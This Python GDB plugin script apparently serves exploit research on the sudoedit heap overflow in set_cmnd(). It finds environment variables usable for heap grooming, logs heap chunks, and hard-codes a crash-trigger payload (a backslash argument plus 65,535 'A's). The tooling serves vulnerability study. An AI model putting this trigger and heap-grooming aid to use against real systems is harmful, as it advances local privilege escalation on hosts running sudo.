from multiprocessing.sharedctypes import Value
from unicodedata import name
from xml.dom.minidom import Identified
import gdb
import binascii
import re

"""
Goal(?)
$ gdb sudoedit
set solib-search-path /lib/sudo

(gdb) list-env-in-heap
    ...
    ...
    Possible envirnoment variables to fuzz: 
        LC_ALL
        TZ
        ...
(gdb) heaplens output.txt
    Successfully write to output.txt
(gdb)

"""

DIVIDER = "-" * 100


def escape_ansi(line):
    ansi_escape = re.compile(r'(?:\x1B[@-_]|[\x80-\x9F])[0-?]*[ -/]*[@-~]')
    return ansi_escape.sub('', line)


class HelloWorld(gdb.Command):
    """Greet the whole world."""

    def __init__(self):
        super().__init__("hello-world", gdb.COMMAND_USER)

    def invoke(self, arg, from_tty):
        result = gdb.execute("disas main", to_string=True)
        print("Writing from python:\n" + result[0:70])
        print("Hello, World!")
        # gdb.execute


# Instantiates the class (register the command)
HelloWorld()

# def int_to_string(n):
#     """Convert int to string. (Not used, not debug-ed)"""
#     # return str(binascii.unhexlify(hex(int(n))[2:]))
#     return bytes.fromhex(hex(int(n))[2:]).decode("ASCII")[::-1]


class ListEnvInHeap(gdb.Command):
    """List envirnoment variables that might affect the heap layout."""

    def __init__(self):
        super(ListEnvInHeap, self).__init__(
            "list-env-in-heap", gdb.COMMAND_USER)

    class GetEnvBreakpoint(gdb.Breakpoint):
        """Log envirnoment variable name at breakpoint."""

        def __init__(self, name, log, *args, **kwargs):
            super().__init__(name, gdb.BP_BREAKPOINT, internal=False)
            # self.silent = False
            self.log = log

        def stop(self):
            # arg = gdb.selected_frame().read_register("$rdi")
            # arg = gef.arch.register("$rdi")
            env = gdb.execute("x/s $rdi", to_string=True)
            match = re.search(r'".+"', env)
            if match:
                var_name = match.group(0)[1:-1]
                if var_name not in self.log['env']:
                    self.log['env'].append(var_name)
            return False

    class FreeBreakpoint(gdb.Breakpoint):
        """Log envirnoment variable that contains 'FuzzMe{number}' at breakpoint."""

        def __init__(self, name, log, *args, **kwargs):
            super().__init__(name, gdb.BP_BREAKPOINT, internal=False)
            # self.silent = False
            self.log = log

        def stop(self):
            # arg = gdb.selected_frame().read_register("$rdi")
            # arg = gef.arch.register("$rdi")
            env = gdb.execute("x/s $rdi", to_string=True)
            match = re.search(r'".+"', env)
            if match:
                value = match.group(0)[1:-1]

                if 'FuzzMe' in value:
                    print(f"\tFound {value}")
                    identifiers = re.findall(r'FuzzMe\d+', value)
                    for i in identifiers:
                        self.log['fuzzable'].append(self.log['env_value'][i])
            return False

    def invoke(self, arg, from_tty):
        # Disable gef output
        gdb.execute(f"gef config context.enable False", to_string=True)

        self.log = {'env': [], 'fuzzable': [], 'env_value': {}}

        # 1st execution: Get envirnoment variables used
        self.getenv_bkps = []
        self.getenv_bkps.append(
            self.GetEnvBreakpoint(name="getenv", log=self.log))

        # Run and print result
        gdb.execute(f"r {arg}")
        print(DIVIDER)
        print("1st execution. Found following envirnoment varible:")
        print(self.log['env'])
        print(DIVIDER)
        self.cleanup(self.getenv_bkps)

        # 2nd execution: Filter envirnoment variables appears in heap
        # set all env variable to recongizeable string
        for i, var_name in enumerate(self.log['env']):
            gdb.execute(f"set environment {var_name} FuzzMe{i}")
            self.log['env_value'][f'FuzzMe{i}'] = var_name
        # print(self.log)

        self.free_bkps = []
        self.free_bkps.append(self.FreeBreakpoint(name="free", log=self.log))

        # Run and print result
        gdb.execute(f"r {arg}")
        print(DIVIDER)
        print("2nd execution. Possible envirnoment variables for heap grooming:")
        print(list(set(self.log['fuzzable'])))
        print(DIVIDER)
        self.cleanup(self.free_bkps)

        # Re-enable gef output
        gdb.execute(f"gef config context.enable True", to_string=True)

    def cleanup(self, bkps):
        print("Removing breakpoints")
        for bp in bkps:
            bp.delete()


# Instantiates the class (register the command)
ListEnvInHeap()

__heaplens_log__ = {'bins': [], 'chunks': []}


class Heaplens(gdb.Command):
    global __heaplens_log__

    def __init__(self):
        super().__init__("heaplens", gdb.COMMAND_USER)

    class GetSetCmndBreakpoint(gdb.Breakpoint):
        """TODO: add description"""

        def __init__(self, name, *args, **kwargs):
            super().__init__(name, gdb.BP_BREAKPOINT, internal=False)

        def stop(self):
            addr_re = r'.*addr=(.{14})'
            bins = gdb.execute("heap bins", to_string=True)
            for bin in bins.splitlines():
                # Example: Chunk(addr=0x56206612bd30, size=0x12d0, flags=PREV_INUSE)
                # address length is 14
                addr = "".join(re.findall(addr_re, bin))
                if addr:
                    __heaplens_log__['bins'].append(addr)
            chunks = gdb.execute("heap chunks", to_string=True)
            for index, chunk in enumerate(chunks.splitlines()):
                addr = "".join(re.findall(addr_re, chunk))
                if addr in __heaplens_log__['bins']:
                    __heaplens_log__['chunks'].append(
                        chunk + "  ←  free chunk")
                else:
                    __heaplens_log__['chunks'].append(chunk)
            return True

    def invoke(self, arg, from_tty):
        print("Initializing heaplens")

        # Disable gef output
        gdb.execute("gef config context.enable False")

        # 1st execution: Make it crash and add breakpoint
        # Code is loaded dynamically, the breakpoint in sudoers.c can be
        # retrieved only if we crash the program
        crash_payload = "-s '\\' $(python3 -c 'print(\"A\"*65535)')"

        # enable batch mode silently to suppress the vim process as inferior
        gdb.execute(f"r {crash_payload}")

        print(DIVIDER)
        print("Setting breakpoints for set_cmnd()")
        self.vul_bkps = []
        self.vul_bkps.append(
            self.GetSetCmndBreakpoint(name="set_cmnd", log=__heaplens_log__))

        print(DIVIDER)
        print("Collecting chunk information")
        # 2nd execution: Inspect.
        gdb.execute(f"r {crash_payload}")

        # gdb.execute("p NewArgv[0]")
        # gdb.execute("p NewArgv[1]")
        # gdb.execute("p NewArgv[2]")
        # gdb.execute(f"x /20xg {new1.split(' ')[2]}")

        # print("\n".join(__heaplens_log__['chunks']))

        self.cleanup(self.vul_bkps)

        # Re-enable gef output
        gdb.execute("gef config context.enable True")

    def cleanup(self, bkps):
        print("Removing breakpoints")
        for bp in bkps:
            bp.delete()
    print("TODO! Should take care of (de)allocation for backtrace")


# Instantiates the class (register the command)
Heaplens()


class HeaplensAddr(gdb.Command):
    global __heaplens_log__

    def __init__(self):
        super().__init__("heaplens-addr", gdb.COMMAND_USER)

    def invoke(self, arg, from_tty):
        print("Showing logged addresses of free chunks:")
        print("\n".join(__heaplens_log__['bins']))


# Instantiates the class (register the command)
HeaplensAddr()


class HeaplensWrite(gdb.Command):
    global __heaplens_log__

    def __init__(self):
        super().__init__("heaplens-write", gdb.COMMAND_USER)

    def invoke(self, arg, from_tty):
        print(f"Writing chunk info: {arg}")
        args = arg.split(" ")

        try:
            with open(args[0], "w+") as f:
                content = ""
                content += "\n".join(__heaplens_log__['chunks'])
                f.write(escape_ansi(content))
            print(f"Successfully write to {arg}")

        except FileNotFoundError:
            print("Usage: heaplens-write <output_file>")
    print("TODO! Should print backtrace")


# Instantiates the class (register the command)
HeaplensWrite()

# Debug: auto run command on gdb startup
# cmds = [
#     "file sudoedit",
#     "list-env-in-heap -s '\\' AAAAAAAAAAAAAAAAAAAAAAAAAAA",
#     "heaplens test.txt",
#     # "q",
# ]
# for cmd in cmds:
#     gdb.execute(cmd)
